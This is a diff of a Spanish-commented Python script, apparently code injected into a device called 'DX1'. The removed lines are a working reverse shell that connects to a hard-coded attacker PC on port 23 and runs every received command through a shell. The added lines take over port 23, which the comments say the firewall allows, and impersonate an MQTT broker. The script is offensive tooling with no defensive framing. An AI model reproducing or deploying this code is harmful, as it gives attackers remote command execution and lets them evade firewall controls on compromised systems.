@@ -1,43 +1,27 @@
-# broker_executor.py - VERSIÓN 025 (MODO TERMINAL)
 import socket
 import threading
-import subprocess
-import os
 
-MI_PC = "192.168.171.156"
-
-def terminal_interactiva(comp, ip_dest):
-    import socket
-    import subprocess
-    
+def start_broker(comp):
     try:
-        # 1. Creamos una única conexión estable
+        # Usamos el puerto 23 porque sabemos que el firewall lo permite
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(None) # Espera infinita
-        s.connect((ip_dest, 23))
-        s.sendall(b"--- DX1 TERMINAL ONLINE ---\nEscribe 'ls', 'id' o 'exit'\n> ")
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(('0.0.0.0', 23))
+        s.listen(5)
+        # Log para saber que hemos "secuestrado" el puerto
+        comp.col_res.insert("MQTT_BROKER: Activo en Puerto 23")
         
         while True:
-            # 2. Esperamos a que TU escribas algo en el Hércules
-            data = s.recv(1024).decode().strip()
-            
-            if not data or data.lower() == "exit":
-                break
-                
-            # 3. Ejecutamos lo que tú mandes como comando de Linux
-            try:
-                # Ejecutamos el comando y capturamos la salida
-                output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT).decode()
-                s.sendall(f"\n{output}\n> ".encode())
-            except Exception as e:
-                s.sendall(f"\nError: {str(e)}\n> ".encode())
-        
-        s.close()
-    except:
-        pass
+            conn, addr = s.accept()
+            # Si recibimos algo, respondemos como un Broker MQTT
+            data = conn.recv(1024)
+            if data:
+                # Enviamos CONNACK (Conexión aceptada)
+                conn.send(b'\x20\x02\x00\x00')
+            conn.close()
+    except Exception as e:
+        comp.col_res.insert(f"Error Broker: {str(e)}")
 
-# Lanzamos un ÚNICO hilo
-# Si ya hay uno corriendo, este fallará al conectar pero no bloqueará todo
-t = threading.Thread(target=terminal_interactiva, args=(self, MI_PC), daemon=True)
+# Lanzamos el hilo para que no bloquee el DX1
+t = threading.Thread(target=start_broker, args=(self,), daemon=True)
 t.start()
-self.col_res.insert("LOG 025: Terminal Lista")
